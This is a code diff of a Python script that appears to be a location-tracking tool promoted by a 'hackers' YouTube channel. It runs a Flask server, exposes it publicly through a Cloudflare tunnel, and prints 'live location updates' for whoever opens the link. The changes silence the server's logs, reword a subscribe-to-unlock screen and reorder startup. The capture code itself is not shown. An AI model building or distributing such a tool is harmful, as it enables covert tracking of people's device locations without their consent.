@@ -36,6 +36,10 @@ def show_location():
     return "Waiting for device location..."
 
 def start_server():
+    # Start Flask server silently (suppress debug/log messages)
+    import logging
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
     app.run(host='0.0.0.0', port=5000)
 
 # --------------------------- Tool Lock & Countdown ----------------------
@@ -43,7 +47,7 @@ def tool_lock():
     os.system(CLEAR)
     print(f"{RED}{'='*80}")
     print(f"{RED}{'🔒 TOOL LOCKED 🔒'.center(80)}")
-    print(f"{RED}{'To unlock, SUBSCRIBE and click the BELL icon on YouTube 🔔'.center(80)}")
+    print(f"{RED}{'Subscribe & click the BELL icon on YouTube 🔔'.center(80)}")
     print(f"{RED}{'='*80}{RESET}\n")
     print(f"{YELLOW}{'Redirecting in:'.center(80)}{RESET}\n")
     
@@ -51,7 +55,7 @@ def tool_lock():
         print(f"{CYAN}{str(i).center(80)}{RESET}")
         time.sleep(1)
     
-    print(f"\n{GREEN}{'OPEN THIS LINK IN YOUTUBE APP:'.center(80)}{RESET}")
+    print(f"\n{GREEN}{'OPEN THIS LINK IN YOUTUBE APP ON YOUR PHONE:'.center(80)}{RESET}")
     print(f"{GREEN}{'https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya'.center(80)}{RESET}\n")
     input(f"{YELLOW}{'Press ENTER after returning from YouTube...'.center(80)}{RESET}")
 
@@ -67,19 +71,19 @@ def show_dashboard(cloudflare_link):
 
 # --------------------------- Main --------------------------
 if __name__ == "__main__":
-    # Start Flask server in background
-    threading.Thread(target=start_server, daemon=True).start()
-    
-    # Show tool lock with countdown and YouTube instruction
+    # First: show lock screen + countdown + YouTube instruction
     tool_lock()
     
-    # ---------------- Cloudflare Tunnel ------------------
-    print(f"{YELLOW}{'NOTE: Start your cloudflared tunnel manually in another Termux session:'.center(80)}{RESET}")
+    # Ask user for Cloudflare URL
+    print(f"{YELLOW}{'NOTE: Start your Cloudflare tunnel manually in another Termux session:'.center(80)}{RESET}")
     print(f"{CYAN}{'cloudflared tunnel --url http://127.0.0.1:5000'.center(80)}{RESET}\n")
     cloudflare_link = input(f"{GREEN}{'Enter your Cloudflare public URL here: '.center(80)}{RESET}")
 
     # Show dashboard
     show_dashboard(cloudflare_link)
+
+    # Start Flask server in background
+    threading.Thread(target=start_server, daemon=True).start()
 
     # Live location updates
     while True:
